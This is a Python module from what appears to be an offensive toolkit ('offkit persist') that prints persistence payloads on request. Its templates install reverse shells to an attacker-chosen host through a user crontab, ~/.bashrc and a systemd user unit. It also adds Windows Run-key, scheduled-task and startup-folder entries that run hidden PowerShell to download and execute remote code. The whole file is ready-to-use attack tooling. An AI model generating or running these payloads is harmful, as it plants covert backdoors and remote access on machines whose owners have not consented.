"""
persist — persistence technique generators
"""

from __future__ import annotations

DESCRIPTION = "persistence technique generators"

import argparse
import sys

TECH = {
    "linux_cron": {
        "os": "linux",
        "desc": "user crontab every 5 min",
        "template": (
            "(crontab -l 2>/dev/null; echo \"*/5 * * * * bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\") | crontab -"
        ),
    },
    "linux_bashrc": {
        "os": "linux",
        "desc": "append to ~/.bashrc",
        "template": "echo 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' >> ~/.bashrc",
    },
    "linux_systemd_user": {
        "os": "linux",
        "desc": "user systemd unit template",
        "template": (
            "# ~/.config/systemd/user/lab.service\n"
            "# systemctl --user enable --now lab.service\n"
            "[Unit]\nDescription=Lab Service\n"
            "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\nRestart=always\n"
            "[Install]\nWantedBy=default.target"
        ),
    },
    "win_run_key": {
        "os": "windows",
        "desc": "HKCU Run key",
        "template": (
            "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
            "/v LabPersist /t REG_SZ /d \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient)."
            "DownloadString('http://{LHOST}/{FILE}')\" /f"
        ),
    },
    "win_schtask": {
        "os": "windows",
        "desc": "scheduled task on logon",
        "template": (
            "schtasks /create /tn \"LabPersist\" /tr \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient)."
            "DownloadString('http://{LHOST}/{FILE}')\" /sc onlogon /rl limited /f"
        ),
    },
    "win_startup": {
        "os": "windows",
        "desc": "startup folder bat",
        "template": (
            "echo powershell -nop -w hidden -c IEX(New-Object Net.WebClient)."
            "DownloadString('http://{LHOST}/{FILE}') > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\lab.bat\""
        ),
    },
}


def list_tech() -> None:
    print("[*] techniques\n")
    for key, t in TECH.items():
        print(f"  {key:25} [{t['os']:8}] {t['desc']}")
    print()


def run(argv: list[str]) -> None:
    p = argparse.ArgumentParser(prog="offkit persist", description=DESCRIPTION)
    p.add_argument("--list", "-l", action="store_true")
    p.add_argument("--technique", "-t")
    p.add_argument("--lhost", "-H")
    p.add_argument("--lport", "-p", type=int, default=4444)
    p.add_argument("--file", "-f", default="payload.ps1")
    args = p.parse_args(argv)

    if args.list or not args.technique:
        list_tech()
        return

    if args.technique not in TECH:
        print(f"[!] unknown: {args.technique}")
        list_tech()
        sys.exit(1)

    t = TECH[args.technique]
    if "{LHOST}" in t["template"] and not args.lhost:
        print("[!] --lhost required")
        sys.exit(1)

    payload = t["template"].format(
        LHOST=args.lhost or "LHOST",
        LPORT=args.lport,
        FILE=args.file,
    )
    print(f"\n[*] {args.technique} — {t['desc']}")
    print("-" * 60)
    print(payload)
    print("-" * 60)
